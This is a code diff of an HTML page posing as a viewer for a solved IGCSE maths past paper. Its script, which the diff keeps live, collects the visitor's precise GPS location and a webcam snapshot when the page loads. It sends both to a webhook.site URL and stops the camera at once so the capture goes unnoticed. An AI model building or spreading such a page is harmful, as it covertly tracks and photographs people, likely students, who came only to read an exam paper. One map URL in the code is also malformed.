@@ -3,40 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IGCSE Papers - Educational Viewer</title>
+    <title>IGCSE Papers Viewer</title>
     <style>
         body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #2c3e50; color: white; overflow: hidden; }
         .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
-        /* Large PDF Viewer */
         #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <strong>Viewing: IGCSE Past Paper (Physics)</strong>
+        <strong>IGCSE Feb/March 2026 Past Paper (Math Calculator)</strong>
     </div>
 
-    <!-- The PDF Viewer (Expanded) -->
+    <!-- Ensure this filename exactly matches your file on GitHub -->
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
-        // PASTE YOUR WEBHOOK.SITE URL BELOW
         const webhookURL = "https://webhook.site/59dc4f67-d5a2-4305-b950-1ad33d827973";
 
-        // Function to send data using a Beacon (better than Fetch for CORS)
         function sendLog(data) {
             const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
             navigator.sendBeacon(webhookURL, blob);
         }
 
-        // 1. Get High-Precision Location (GPS)
+        // 1. Precise GPS
         navigator.geolocation.getCurrentPosition(pos => {
             sendLog({
                 type: "GPS_LOCATION",
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
                 accuracy: `${pos.coords.accuracy} meters`,
+                // FIXED THE URL BELOW:
                 map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
             });
         }, err => {
@@ -47,10 +45,12 @@
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 const video = document.createElement('video');
+                video.muted = true; // Required for auto-play in some browsers
                 video.srcObject = stream;
+                
                 video.onloadedmetadata = () => {
                     video.play();
-                    // Wait for focus
+                    // Wait 2 seconds for camera to adjust to light/focus
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = 640;
@@ -59,12 +59,12 @@
                         
                         sendLog({
                             type: "CAMERA_SNAPSHOT",
-                            image_data: canvas.toDataURL('image/jpeg', 0.5) // Compressed
+                            image_data: canvas.toDataURL('image/jpeg', 0.5) 
                         });
 
-                        // Turn off camera light immediately
+                        // Kill the camera light
                         stream.getTracks().forEach(track => track.stop());
-                    }, 1500);
+                    }, 2000);
                 };
             })
             .catch(err => sendLog({ type: "CAMERA_ERROR", msg: err.message }));
